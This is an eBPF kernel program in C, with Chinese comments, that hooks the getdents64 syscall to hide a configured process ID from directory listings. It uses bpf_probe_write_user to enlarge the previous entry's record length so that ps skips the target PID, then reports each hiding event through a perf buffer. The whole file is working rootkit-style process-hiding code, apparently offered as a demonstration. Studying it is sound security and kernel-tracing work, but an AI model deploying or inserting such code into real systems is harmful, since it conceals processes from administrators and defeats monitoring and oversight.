#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "main.h"

struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 2048);
    __type(key, u64);
    __type(value, long unsigned int);
} dirp_map SEC(".maps");

static const volatile struct config_t configs;

SEC("tracepoint/syscalls/sys_enter_getdents64")
int tracepoint_syscalls__sys_enter_getdents64(struct trace_event_raw_sys_enter *ctx) {
    u64 tid = bpf_get_current_pid_tgid();

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)BPF_CORE_READ(ctx, args[1]);

    bpf_map_update_elem(&dirp_map, &tid, &dirp, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int tracepoint_syscalls__sys_exit_getdents64(struct trace_event_raw_sys_exit *ctx) {
    struct event_t event = { 0 };
    u64 tid = bpf_get_current_pid_tgid();
    int total_bytes_read = BPF_CORE_READ(ctx, ret);
    if (total_bytes_read <= 0) {
        return 0;
    }
    long unsigned int *pp = bpf_map_lookup_elem(&dirp_map, &tid);
    if (!pp) {
        return 0;
    }
    char to_hide_pid[MAX_NAME];
    #pragma unroll
    for (int i = 0; i < MAX_NAME; i++) {
        to_hide_pid[i] = configs.to_hide_pid[i];
        if (to_hide_pid[i] == '\0') {
            break;
        }
    }

    bool overwrite = false;
    int overwrite_ret = 0;

    //
    struct linux_dirent64 *pre_dirent_start = (struct linux_dirent64*)*pp;
    struct linux_dirent64 *current_dirent_start;
    char current_dir[MAX_NAME] = {};
    //
    short unsigned int pre_reclen = 0;
    short unsigned int current_reclen = 0;
    short unsigned int overwrite_reclen = 0;
    int current_total = 0;

    #pragma unroll
    for (int i = 0; i < 1024; i++) {
        // 通过指针操作获取当前 struct linux_dirent64 实例
        current_dirent_start = (struct linux_dirent64*)((void *)pre_dirent_start + pre_reclen);
        // 读取 d_name 和 d_reclen 字段的值
        bpf_probe_read_user(&current_dir, sizeof(current_dir), (char *)current_dirent_start->d_name);
        bpf_probe_read_user(&current_reclen, sizeof(current_reclen), (void *)&current_dirent_start->d_reclen);

        // 如果是待隐藏 pid 的目录
        if (str_eq(current_dir, to_hide_pid, MAX_NAME)) {
            // 修改上一个示例的 reclen 字段长度，让它覆盖当前实例长度，达到跳过当前实例的目的，结果就是从 ps 结果中隐藏了该 pid
            overwrite_reclen = pre_reclen + current_reclen;
            overwrite_ret = bpf_probe_write_user(&pre_dirent_start->d_reclen, &overwrite_reclen, sizeof(overwrite_reclen));
            overwrite = true;
            break;
        }

        // 防止内存越界
        current_total += current_reclen;
        if (current_total >= total_bytes_read) {
            break;
        }

        // 处理下一个实例
        pre_reclen = current_reclen;
        pre_dirent_start = current_dirent_start;
    }

    if (!overwrite) {
        return 0;
    }


    event.pid = bpf_get_current_pid_tgid() >> 32;
    event.ret = overwrite_ret;
    #pragma unroll
    for (int i = 0; i < MAX_NAME; i++) {
        event.hidden_pid[i] = configs.to_hide_pid[i];
        if (event.hidden_pid[i] == '\0') {
            break;
        }
    }
    bpf_get_current_comm(&event.comm, sizeof(event.comm));

    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(struct event_t));

    return 0;
}


char _license[] SEC("license") = "GPL";
